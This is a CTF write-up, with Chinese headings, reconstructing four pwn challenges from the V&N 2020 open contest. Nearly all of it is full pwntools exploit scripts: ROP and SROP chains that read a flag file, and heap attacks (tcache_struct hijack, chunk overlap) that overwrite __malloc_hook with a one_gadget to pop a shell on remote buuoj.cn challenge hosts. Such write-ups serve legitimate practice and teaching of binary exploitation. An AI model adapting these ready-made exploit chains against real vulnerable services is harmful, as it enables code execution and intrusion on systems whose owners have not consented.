## V&N_2020公开赛_pwn复现

#### warmup

rop+orw

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context(arch='amd64',os='linux',log_level='debug')

elf = ELF('./vn_pwn_warmup')
io = remote('node3.buuoj.cn',25390)
libc = ELF('./libc/libc-2.23.so')
bss = 0x3c5c40

io.recvuntil('gift: ')
libc_base = int(io.recv(14),16)-libc.sym['puts']
log.success('libc: '+hex(libc_base))
io.recvuntil('ing: ')

ret = libc_base + 0xe8c0e # xor esi, esi; ret
pop_rdx = libc_base + 0x1b92
pop_rdi = libc_base + 0x21102
pop_rsi = libc_base + 0x202e8
write = libc_base + libc.sym['write']
read = libc_base + libc.sym['read']
openfile = libc_base + libc.sym['open']
path_addr = bss+libc_base
flag_addr = bss+libc_base+0x10
rop = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(path_addr)+p64(pop_rdx)+p64(0x10)+p64(read)
rop += p64(pop_rdi)+p64(path_addr)+p64(pop_rsi)+p64(0)+p64(openfile)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(read)
rop += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(write)

io.send(rop)

payload = 0x78*'A'
payload += p64(ret)
io.sendafter('name?',payload)
sleep(0)

path = raw_input('input flag path:')
io.send(path.strip()+'\x00')
print io.recv()
```

#### babybabypwn1

sigreturn+Stack migration+orw

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

elf  = ELF('./vn_pwn_babybabypwn_1')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc/libc-2.23.so')
bss = 0x3C5C40

#io = process(elf.path)
io = remote('node3.buuoj.cn',29239)

io.recvuntil('gift: ')
libc_base = int(io.recv(14),16)-libc.sym['puts']
log.success('libc : '+hex(libc_base))

frame = SigreturnFrame()
frame.rdi=0
frame.rsi=bss+libc_base
frame.rdx=0x200
frame.rip=libc.sym['read']+libc_base
frame.rsp=bss+libc_base

io.sendafter('message: ',str(frame)[8:])

sleep(0.5)
pop_rdi = libc_base + 0x21102
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92
write = libc_base + libc.sym['write']
read = libc_base + libc.sym['read']
openfile = libc_base + libc.sym['open']
path_addr = bss+libc_base+0x100
flag_addr = bss+libc_base+0x110
rop = p64(pop_rdi)+p64(path_addr)+p64(pop_rsi)+p64(0)+p64(openfile)
rop += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(read)
rop += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(write)
rop = rop.ljust(0x100,'\x00')
rop += '/flag\x00'

io.send(rop)
print io.recv()
```

#### easyTheap

劫持tcache_struct

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-v']

def pause_debug():
    log.info(proc.pidof(p))
    pause()

def add(size):
    p.sendlineafter('choice:', str(1))
    p.sendlineafter('size?', str(size))

def edit(idx, content):
    p.sendlineafter('choice:', str(2))
    p.sendlineafter('idx?', str(idx))
    p.sendafter('content:', content)

def show(idx):
    p.sendlineafter('choice:', str(3))
    p.sendlineafter('idx?', str(idx))

def delete(idx):
    p.sendlineafter('choice:', str(4))
    p.sendlineafter('idx?', str(idx))

proc_name = './vn_pwn_easyTHeap'
#p = process(proc_name)
p = remote('node3.buuoj.cn',29591)
elf = ELF(proc_name)
libc = ELF('./libc/libc-2.27.so')
add(0x100) # 0
add(0x18) # 1
delete(0)
delete(0)
show(0)
heap_addr = u64(p.recv(6).ljust(0x8, b'\x00')) - 0x250
add(0x100) # 2 0
edit(2, p64(heap_addr))
add(0x100) # 3 0
add(0x100) # 4 heap_addr
edit(4, b'\x07'.rjust(0x10, b'\x00'))
delete(0) # unsorted bin
show(0)
libc_base = u64(p.recv(6).ljust(0x8, b'\x00')) - 4111520
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadget = libc_base + 0x4f322

edit(4, b'\x01'.rjust(0x10, b'\x00') + p64(0) * 21 + p64(malloc_hook - 8)) # heap_addr
add(0x100) # 5 fake_chunk 
edit(5, p64(one_gadget) + p64(realloc + 8))
add(0x100)
p.interactive()
```

simpleheap

overlap

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context.log_level='debug'
#p=process('./vn_pwn_simpleHeap')
p=remote('node3.buuoj.cn',)
elf=ELF('./vn_pwn_simpleHeap')
libc=ELF('./libc-2.23.so')

def add(size,content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size?')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.sendline(content)

def edit(idx,content):

    p.sendline('2')
    p.recvuntil('idx?')
    p.sendline(str(idx))
    p.recvuntil('content:')
    p.sendline(content)

def show(idx):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('idx?')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('idx?')
    p.sendline(str(idx))

add(0x18,'pppp')
add(0x60,'pppp')
add(0x60,'pppp')
add(0x10,'pppp')

#fake chunk
payload='p'*0x18+'\xe1'
edit(0,payload)
delete(1)
add(0x60,'pppp')
#gdb.attach(p)
show(2)
main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-88
libc_base=main_arena-0x3c4b20
libc_one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget=libc_base+libc_one_gadget[1]
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['__libc_realloc']
fake_chunk=malloc_hook-0x23
add(0x60,'pppp')
delete(4)
payload=p64(fake_chunk)
edit(2,payload)
add(0x60,'pppp')
payload='p'*0xb+p64(one_gadget)+p64(realloc+13)
add(0x60,payload)

p.interactive()
```

